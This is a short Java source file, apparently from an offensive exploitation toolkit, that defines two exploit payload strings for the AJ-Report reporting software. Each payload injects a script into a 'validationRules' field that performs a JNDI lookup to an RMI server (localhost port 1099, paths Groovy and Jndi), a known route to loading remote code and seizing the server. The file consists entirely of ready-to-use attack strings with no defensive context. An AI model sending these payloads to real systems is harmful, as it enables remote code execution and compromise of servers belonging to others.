package com.liev.clouds.payload;

/**
 * @author Revcloud
 * @since 2024/7/26 17:20
 */
public class AjReportPayload {
    public final static String GORRVY_EXP = "{\"sampleItem\":\"1\",\"validationRules\":\"function verification(data){initialContext=new javax.naming.InitialContext();initialContext.lookup(\\\"rmi://127.0.0.1:1099/Groovy\\\");}\"}";

    public final static String JNDI_EXP = "{\"sampleItem\":\"1\",\"validationRules\":\"function verification(data){initialContext=new javax.naming.InitialContext();initialContext.lookup(\\\"rmi://127.0.0.1:1099/Jndi\\\");}\"}";
}
